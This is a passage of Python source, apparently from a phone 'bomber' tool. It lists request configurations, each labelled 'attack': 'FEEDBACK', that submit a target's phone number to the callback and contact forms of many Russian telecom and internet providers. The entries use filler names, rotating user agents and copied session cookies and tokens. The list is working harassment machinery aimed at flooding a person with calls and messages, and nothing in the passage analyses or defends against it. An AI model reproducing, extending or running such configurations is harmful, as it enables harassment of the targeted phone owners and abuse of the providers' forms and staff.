            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://ellco.ru', 'Referer': 'https://ellco.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'},
            'json': {'fullName': 'INSIDE', 'phone': f'+7({str(number)[1:4]}){str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}', 'connectionAdress': 'INSIDE', 'connectionType': 'apartment', 'tariffs': '',},
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Eneva.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://eneva.ru/wp-json/contact-form-7/v1/contact-forms/849/feedback',
            'cookies': {'tmr_lvid': 'ac958330a0fc3ca5dce56ae26662bd18', 'tmr_lvidTS': '1687867279409', '_ym_uid': '1687867280213875353', '_ym_d': '1687867280', '_ym_isad': '1', '_ym_visorc': 'w', '_ga_6JSBQ40FXC': 'GS1.1.1687867279.1.0.1687867279.0.0.0', '_ga': 'GA1.1.1254367177.1687867280', 'tmr_detect': '0%7C1687867281826',},
            'headers': {'Accept': 'application/json, */*;q=0.1', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryxAPITZ4obFB5WYHA', 'Origin': 'https://eneva.ru', 'Referer': 'https://eneva.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'------WebKitFormBoundaryxAPITZ4obFB5WYHA\r\nContent-Disposition: form-data; name="_wpcf7"\r\n\r\n849\r\n------WebKitFormBoundaryxAPITZ4obFB5WYHA\r\nContent-Disposition: form-data; name="_wpcf7_version"\r\n\r\n5.4.2\r\n------WebKitFormBoundaryxAPITZ4obFB5WYHA\r\nContent-Disposition: form-data; name="_wpcf7_locale"\r\n\r\nru_RU\r\n------WebKitFormBoundaryxAPITZ4obFB5WYHA\r\nContent-Disposition: form-data; name="_wpcf7_unit_tag"\r\n\r\nwpcf7-f849-o3\r\n------WebKitFormBoundaryxAPITZ4obFB5WYHA\r\nContent-Disposition: form-data; name="_wpcf7_container_post"\r\n\r\n0\r\n------WebKitFormBoundaryxAPITZ4obFB5WYHA\r\nContent-Disposition: form-data; name="_wpcf7_posted_data_hash"\r\n\r\n\r\n------WebKitFormBoundaryxAPITZ4obFB5WYHA\r\nContent-Disposition: form-data; name="text-123"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryxAPITZ4obFB5WYHA\r\nContent-Disposition: form-data; name="text-332"\r\n\r\n+7 ({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}\r\n------WebKitFormBoundaryxAPITZ4obFB5WYHA\r\nContent-Disposition: form-data; name="calltime"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryxAPITZ4obFB5WYHA\r\nContent-Disposition: form-data; name="street"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryxAPITZ4obFB5WYHA\r\nContent-Disposition: form-data; name="house"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryxAPITZ4obFB5WYHA\r\nContent-Disposition: form-data; name="promocode"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryxAPITZ4obFB5WYHA\r\nContent-Disposition: form-data; name="ord"\r\n\r\n\r\n------WebKitFormBoundaryxAPITZ4obFB5WYHA\r\nContent-Disposition: form-data; name="podkl"\r\n\r\nДом не подключен к Еневе\r\n------WebKitFormBoundaryxAPITZ4obFB5WYHA\r\nContent-Disposition: form-data; name="is-podkl"\r\n\r\n0\r\n------WebKitFormBoundaryxAPITZ4obFB5WYHA\r\nContent-Disposition: form-data; name="your-consent"\r\n\r\n1\r\n------WebKitFormBoundaryxAPITZ4obFB5WYHA--\r\n'.encode(),
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'KamenskTel.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://kamensktel.ru/tpl/scripts/connect_form.php',
            'cookies': {'PHPSESSID': '89e8e436afe79a8f6629227299fff2c6', '_ym_uid': '168786758691582926', '_ym_d': '1687867586', '_ym_isad': '1', '_ym_visorc': 'w',},
            'headers': {'authority': 'kamensktel.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://kamensktel.ru', 'referer': 'https://kamensktel.ru/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest'},
            'data': {'page': 'Для дома', '_action': 'send', 'utm': 'bottom_bar', 'surname': '', 'name': 'INSIDE', 'phone': f'+{number}', 'problem': '', 'claim': '', 'address': 'INSIDE', 'comment': 'INSIDE', 'internet_type': 'home', 'time_call': '', 'call_from_service': '3', 'af_action': '5294d7c9ab962c3623fbfdef909148f1',},
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Custom-Service.com', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://forms.tildacdn.com/procces/',
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://www.custom-service.com', 'Referer': 'https://www.custom-service.com/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'formservices%5B%5D=1fcef5a472e04d47bc370aad33215a34&formservices%5B%5D=36ac94c25f637d26a9d19f47e4081491&formservices%5B%5D=914fb55106295e2fab4ac6cb939d4733&formservices%5B%5D=43a2cf95dc3bfd79f568fd053fb17ff2&formservices%5B%5D=a7c153b8c62d9879d90455643eee8ef4&formservices%5B%5D=b1939f9b11fcc97b1d802a6a5bfd1b4c&formservices%5B%5D=8e0ee011cc86b758e8914da9eae0afd1&formservices%5B%5D=287bed0b2da4cddb2e88903d311abcc7&formservices%5B%5D=6b7d70831626f8f0940bd2a2be37e9a2&tildaspec-formname=%D0%97%D0%B0%D1%8F%D0%B2%D0%BA%D0%B0+%D0%BD%D0%B0+%D1%83%D1%81%D0%BB%D1%83%D0%B3%D0%B8+%D0%BC%D0%B5%D0%BD%D1%8E&name=INSIDE&email={email()}&tildaspec-phone-part%5B%5D-iso=+7&tildaspec-phone-part%5B%5D=({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}&phone=+7 ({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}&service=%D0%9E%D1%82%D0%B2%D0%B5%D1%82%D1%81%D1%82%D0%B2%D0%B5%D0%BD%D0%BD%D0%BE%D0%B5+%D1%85%D1%80%D0%B0%D0%BD%D0%B5%D0%BD%D0%B8%D0%B5&commentary=INSIDE&confidentiality+=yes&not_the_first_shipment=yes&legal_person=yes&form-spec-comments=&tildaspec-cookie=v1_referrer_callibri%3D%3B+v1_data%3D%3B+_ym_uid%3D1687867956287190850%3B+_ym_d%3D1687867956%3B+_ym_isad%3D1%3B+clbvid%3D649ad24db991ec4d5a1c64df%3B+_ym_visorc%3Dw%3B+tildauid%3D1687867957875.866985%3B+tildasid%3D1687867957875.538049%3B+previousUrl%3Dwww.custom-service.com%252Ftilda%252Fpopup%252Frec499324268%252Fopened&tildaspec-referer=https%3A%2F%2Fwww.custom-service.com%2F&tildaspec-formid=form499324268&tildaspec-formskey=5a2fff2bb1b1174ca5aa1eeb46157261&tildaspec-version-lib=02.001&tildaspec-pageid=30790893&tildaspec-projectid=6157261&tildaspec-lang=RU&tildaspec-fp=6354646d38686331326c72757057696e333276476f6f676c6520496e632e614d6f7a696c6c616e4e65747363617065706c696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d7669657765727072312e31313030303030313433303531313437773131303768383338',
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Domru.site', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://domru.site/wp-admin/admin-ajax.php',
            'cookies': {'utm_source': 'domru-site', 'utm_medium': 'cpc', 'utm_campaign': '%D0%94%D0%BE%D0%BC%D1%80%D1%83_%D0%A0%D0%BE%D1%81%D1%82%D0%BE%D0%B2_%D0%BD%D0%B0_%D0%94%D0%BE%D0%BD%D1%83', 'utm_content': 'cid%7C89817479%7Cgid%7C5226631750%7Caid%7C14502551515%7Cadp%7Cno%7Cdvc%7Cdesktop%7Cpid%7C45757992249%7Crid%7C45757992249%7Cdid%7C45757992249%7Cpos%7Cpremium1%7Cadn%7Csearch%7Ccrid%7C0%7C', 'utm_term': '%D0%B4%D0%BE%D0%BC%20%D1%80%D1%83', 'RhVpADdNkuqM': 'KYdWvZ%5D7OoC', 'XeBsHDtR': 'uPIhp9zwJtUgl', '_ym_uid': '1687868925645793768', '_ym_d': '1687868925', '_ym_isad': '1', '_ym_visorc': 'w', '_gid': 'GA1.2.1803419394.1687868925', '_gat_gtag_UA_213429415_2': '1', '_ga': 'GA1.1.1524302918.1687868925', 'wt_geo_data': '%7B%22country%22%3A%22%5Cu0423%5Cu0437%5Cu0431%5Cu0435%5Cu043a%5Cu0438%5Cu0441%5Cu0442%5Cu0430%5Cu043d%22%2C%22district%22%3Anull%2C%22region%22%3A%22%5Cu0422%5Cu0430%5Cu0448%5Cu043a%5Cu0435%5Cu043d%5Cu0442%22%2C%22city%22%3A%22%5Cu0422%5Cu0430%5Cu0448%5Cu043a%5Cu0435%5Cu043d%5Cu0442%22%2C%22lat%22%3A41.26465%2C%22lng%22%3A69.21627%7D', 'siteOpenTimestamp': '', '_ga_8LRBRRGD7V': 'GS1.1.1687868925.1.1.1687868943.0.0.0'},
            'headers': {'authority': 'domru.site', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://domru.site', 'referer': 'https://domru.site/rnd/?utm_source=domru-site&utm_medium=cpc&utm_campaign=%D0%94%D0%BE%D0%BC%D1%80%D1%83_%D0%A0%D0%BE%D1%81%D1%82%D0%BE%D0%B2_%D0%BD%D0%B0_%D0%94%D0%BE%D0%BD%D1%83&utm_content=cid|89817479|gid|5226631750|aid|14502551515|adp|no|dvc|desktop|pid|45757992249|rid|45757992249|did|45757992249|pos|premium1|adn|search|crid|0|&utm_term=%D0%B4%D0%BE%D0%BC%20%D1%80%D1%83&etext=2202.d4rPQT7dDhsj4no9aQDZIV4ugySbqAcgsA8Cb7pbT_R0dmN6c2N5ZGxybmRzcnd0.e3c82682a6cc6f45c4043b05b59bbd44d5087da6&yclid=3409682784504584705', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest'},
            'data': f'city=%D0%A0%D0%BE%D1%81%D1%82%D0%BE%D0%B2-%D0%BD%D0%B0-%D0%94%D0%BE%D0%BD%D1%83&b24trace=&name=INSIDE&phone=+7({str(number)[1:4]}){str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}&address=INSIDE&lVtPpjChsDNdgHZF=gac9JU_.7Z&-niCAQcqNDV=L%5D1yhS.amuY_&D-s_bKrzJ=HAaVuGolpOMJ*6z&lVtPpjChsDNdgHZF=gac9JU_.7Z&-niCAQcqNDV=L]1yhS.amuY_&D-s_bKrzJ=HAaVuGolpOMJ*6z',
            'params': {'action': 'send',},
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Domru.site', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.carrottrack.app/users/$self_user/props',
            'headers': {'authority': 'api.carrottrack.app', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryEU7RjWfwPyn4MWB6', 'origin': 'https://perm.dom.ru', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'cross-site', 'user-agent': user_agent()[1],},
            'data': '------WebKitFormBoundaryEU7RjWfwPyn4MWB6\r\nContent-Disposition: form-data; name="operations"\r\n\r\n[{"op":"update_or_create","key":"$phone","value":"+' + str(number) + '"}]\r\n------WebKitFormBoundaryEU7RjWfwPyn4MWB6\r\nContent-Disposition: form-data; name="_nonce"\r\n\r\nkRAyWAbnkdFouHDZB06oAIUu1M3ydRim\r\n------WebKitFormBoundaryEU7RjWfwPyn4MWB6\r\nContent-Disposition: form-data; name="auth_token"\r\n\r\nuser.1474392672411062211.27220-2227918ba58cf5d42173e53591.2b11e984ccc6fca9f8e08b2a74be5c619df38ad8c5cb7ed8\r\n------WebKitFormBoundaryEU7RjWfwPyn4MWB6\r\nContent-Disposition: form-data; name="id_as_string"\r\n\r\ntrue\r\n------WebKitFormBoundaryEU7RjWfwPyn4MWB6--\r\n',
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Domru.site', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api-request.dom.ru/v1/user/request-by-connection',
            'headers': {'authority': 'api-request.dom.ru', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9', 'content-type': 'application/json; charset=UTF-8', 'domain': 'perm', 'origin': 'https://perm.dom.ru', 'referer': 'https://perm.dom.ru/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1],},
            'json': {'fio': 'INSIDE', 'phone': number, 'ga_cid': '1725713118.1687869276', 'check_call_type': '/', 'domain': 'perm', 'product_id': '5', 'city_id': 1, 'ymUid': '168786927668254791',},
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'MTT.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.mtt.ru/backend/add-form-result.php',
            'cookies': {'PHPSESSID': 'qeSTaGUQlg6xSJLnnitzmD2Ld4fnELvj', 'MTT_SM_SALE_UID': '3682044f9a04a139cb7394d9b003e950', 'BITRIX_CONVERSION_CONTEXT_s1': '%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1687899540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D', 'BX_USER_ID': 'b1944a972bb0c88dfb191ece99efe23b', 'tmr_lvid': '7c448ce2a3aabc738a271c4b5f03f3ed', 'tmr_lvidTS': '1687869763404', '_gid': 'GA1.2.4000614.1687869764', '_ym_uid': '1687869764368600948', '_ym_d': '1687869764', 'cted': 'modId%3D1fa8887b%3Bclient_id%3D887989855.1687869764%3Bya_client_id%3D1687869764368600948', 'OAuth': '793785826', 'wr_visit_id': '793785826', '_ym_isad': '1', '_dc_gtm_UA-52521450-1': '1', 'ga_cid': '887989855.1687869764', '_ct_ids': '1fa8887b%3A10994%3A3040139813', '_ct_session_id': '3040139813', '_ct_site_id': '10994', 'call_s': '%3C!%3E%7B%221fa8887b%22%3A%5B1687871589%2C3040139813%2C%7B%2250983%22%3A%22171591%22%7D%5D%2C%22d%22%3A2%7D%3C!%3E', '_ct': '300000001527712823', '_ct_client_global_id': '098bcbde-5abd-51c9-9f9c-71bdfded896f', '_ym_visorc': 'w', '_ga_9EMGRBYQ05': 'GS1.1.1687869763.1.0.1687869766.0.0.0', 'tmr_detect': '0%7C1687869771460', '_ga': 'GA1.2.887989855.1687869764', '_gat_UA-52521450-1': '1', '_ga_054895ELP6': 'GS1.1.1687869763.1.0.1687869777.0.0.0'},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary89Y6CTnpjrqyUPQ8', 'Origin': 'https://www.mtt.ru', 'Referer': 'https://www.mtt.ru/call-me/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'},
            'data': f'------WebKitFormBoundary89Y6CTnpjrqyUPQ8\r\nContent-Disposition: form-data; name="WEB_FORM_ID"\r\n\r\n1\r\n------WebKitFormBoundary89Y6CTnpjrqyUPQ8\r\nContent-Disposition: form-data; name="web_form_submit"\r\n\r\nY\r\n------WebKitFormBoundary89Y6CTnpjrqyUPQ8\r\nContent-Disposition: form-data; name="web_form_apply"\r\n\r\nY\r\n------WebKitFormBoundary89Y6CTnpjrqyUPQ8\r\nContent-Disposition: form-data; name="sessid"\r\n\r\ne0b71c2384ef7b50a9df729ca5ef9dc8\r\n------WebKitFormBoundary89Y6CTnpjrqyUPQ8\r\nContent-Disposition: form-data; name="form_text_1"\r\n\r\n+7 ({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}\r\n------WebKitFormBoundary89Y6CTnpjrqyUPQ8--\r\n',
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'YouMagic.com', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://youmagic.com/handlers/form.php',
            'cookies': {'PHPSESSID': '3tNvi36B0czfY4JO5vrsKGxJ8UvOxr6C', '_ym_uid': '1687870163133598076', '_ym_d': '1687870163', '_ym_isad': '1', '_ga': 'GA1.1.2031547838.1687870163', '_ym_visorc': 'w', 'BX_USER_ID': '0ea5340777dd9253e9c887ac2d500e2a', '_ga_0400PQLJB8': 'GS1.1.1687870163.1.1.1687870223.0.0.0'},
            'headers': {'authority': 'youmagic.com', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://youmagic.com', 'referer': 'https://youmagic.com/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest'},
            'data': f'name=INSIDE&phone=+7({str(number)[1:4]}){str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}&email={email()}&inn=018314925201&comment__form=&dops=&link=https%3A%2F%2Fyoumagic.com%2F&token=03AL8dmw8sqzLn0y7aZu5B2HAZ1h4HW5DmHDIWt8S2Fb1oOElT8BJBsB5fXGgFbXAW2lQUTdKTqVkm-dv55MkRA88Zn9XGW7lbNUV1zI0Qb-R9SLJpttu-PXyEez-cGgnzmJe11tv-eGiEuzTlHuJzIz95TpqOQ4QGiOYUAGOFKOr7ILQoZzVznRbEiT30ANOlGZ911VPotylHDPgGHkZTW1fcZtb1keO6GT1QXEaOyLxxav4SS9Hp0gWegBaiVGCtb6V7EI-rY0cidDEK-ZrvqiQ_QUtaFKgJ_3Dpx1q8DL9ukeseIxA87a1m3C9m4MM4L0nF747Q_3n22BE6JLbY53KonUdKVdzKhqGRxBHLL_wNNDcU6TKwflkWoc5CroXvphJ7KcHjC1HmveZuFuIRlE-oYXAagd8wlXe08W7kTiRi9BaHYoB1FBu1HOxyMVa7gek-b_N5q0qMPf6Ag94HqYUF7GZY3gqjbtoqKfkIDAJXl3wt5J5rDowOQwrw_KpNEj-rh5277ETcWlfu8qyk6jOsPRRUKzdV-Q&sessid=1d31f29da401bfa8b5763f34cbbfd8b6',
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Tsinet.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.tsinet.ru/',
            'headers': {'authority': 'www.tsinet.ru', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ru,en;q=0.9', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://www.tsinet.ru', 'referer': 'https://www.tsinet.ru/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent()[1],},
            'data': {'name': 'INSIDE', 'email': email(), 'phone': number, 'comment': 'INSIDE', 'Request': '1',},
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Callobok.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://voice.bitrix24.ru/bitrix/services/main/ajax.php',
            'headers': {'authority': 'voice.bitrix24.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9', 'cache-control': 'max-age=0', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarypD5DGBb9GTBeAa2X', 'origin': 'https://callobok.ru', 'referer': 'https://callobok.ru/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'cross-site', 'user-agent': user_agent()[1],},
            'data': '------WebKitFormBoundarypD5DGBb9GTBeAa2X\r\nContent-Disposition: form-data; name="values"\r\n\r\n{"LEAD_NAME":["INSIDE"],"LEAD_EMAIL":["' + email() + '"],"LEAD_PHONE":["' + f'+7 ({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}' + '"],"LEAD_UF_CRM_1608627368":["INSIDE"]}\r\n------WebKitFormBoundarypD5DGBb9GTBeAa2X\r\nContent-Disposition: form-data; name="properties"\r\n\r\n{}\r\n------WebKitFormBoundarypD5DGBb9GTBeAa2X\r\nContent-Disposition: form-data; name="consents"\r\n\r\n{"AGREEMENT_15":"Y"}\r\n------WebKitFormBoundarypD5DGBb9GTBeAa2X\r\nContent-Disposition: form-data; name="recaptcha"\r\n\r\nundefined\r\n------WebKitFormBoundarypD5DGBb9GTBeAa2X\r\nContent-Disposition: form-data; name="timeZoneOffset"\r\n\r\n-300\r\n------WebKitFormBoundarypD5DGBb9GTBeAa2X\r\nContent-Disposition: form-data; name="id"\r\n\r\n25\r\n------WebKitFormBoundarypD5DGBb9GTBeAa2X\r\nContent-Disposition: form-data; name="sec"\r\n\r\nqrx63m\r\n------WebKitFormBoundarypD5DGBb9GTBeAa2X\r\nContent-Disposition: form-data; name="lang"\r\n\r\nru\r\n------WebKitFormBoundarypD5DGBb9GTBeAa2X\r\nContent-Disposition: form-data; name="trace"\r\n\r\n{"url":"https://callobok.ru/#features","device":{"isMobile":false},"tags":{"ts":1687871752,"list":{},"gclid":null},"client":{"gaId":"739500671.1687871751","yaId":"1687871752554629822"},"pages":{"list":[["https://callobok.ru/#features",1687871752,"CALLOBOK"]]},"gid":null,"previous":{"list":[]}}\r\n------WebKitFormBoundarypD5DGBb9GTBeAa2X\r\nContent-Disposition: form-data; name="entities"\r\n\r\n[]\r\n------WebKitFormBoundarypD5DGBb9GTBeAa2X\r\nContent-Disposition: form-data; name="security_sign"\r\n\r\nundefined\r\n------WebKitFormBoundarypD5DGBb9GTBeAa2X--\r\n',
            'params': {'action': 'crm.site.form.fill',},
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Babilon-T.com', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.babilon-t.com/index.php/ru/',
            'cookies': {'88964e3344a63d16bee965681f1f5f33': 'b0cgob97pm90ai40ontrn88u71', '28d8546ec5f2442931d27cb1f91aef51': 'ru-RU', '_ym_uid': '1687872419308732145', '_ym_d': '1687872419', '_ym_isad': '1', '_ym_visorc': 'w'},
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://www.babilon-t.com', 'Referer': 'https://www.babilon-t.com/index.php/ru/?option=com_btmap', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'action': 'send_request', 'f[id]': '', 'f[lat]': '55.755864', 'f[lng]': '37.617698', 'f[address]': 'проезд Воскресенские Ворота', 'f[contact]': number, 'f[name]': 'INSIDE', 'f[description]': 'INSIDE',},
            'params': {'option': 'com_btmap',},
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'KamTV.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.kamtv.ru/wp-content/themes/sktv/send.php',
            'cookies': {'PHPSESSID': 'stcnpei23gp9ourjjo7eudtl7q',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryzh5BBs67FCNzgVV4', 'Origin': 'https://www.kamtv.ru', 'Referer': 'https://www.kamtv.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'------WebKitFormBoundaryzh5BBs67FCNzgVV4\r\nContent-Disposition: form-data; name="title"\r\n\r\nСтать клиентом\r\n------WebKitFormBoundaryzh5BBs67FCNzgVV4\r\nContent-Disposition: form-data; name="name"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryzh5BBs67FCNzgVV4\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{number}\r\n------WebKitFormBoundaryzh5BBs67FCNzgVV4--\r\n'.encode(),
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Teleseti.com', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.teleseti.com/zayvka',
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/json;charset=utf-8', 'Origin': 'https://teleseti.com', 'Referer': 'https://teleseti.com/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'},
            'json': {'name': 'INSIDE', 'mobile': f'+{number}', 'town': 'Владимирский лагерь\t', 'street': '23', 'house': '34', 'apartament': '42', 'tariff': 'Для меня', 'device': 'Windows Google Chrome', 'login': None},
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'K-Telecom.org', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://k-telecom.org/wp-json/contact-form-7/v1/contact-forms/13579/feedback',
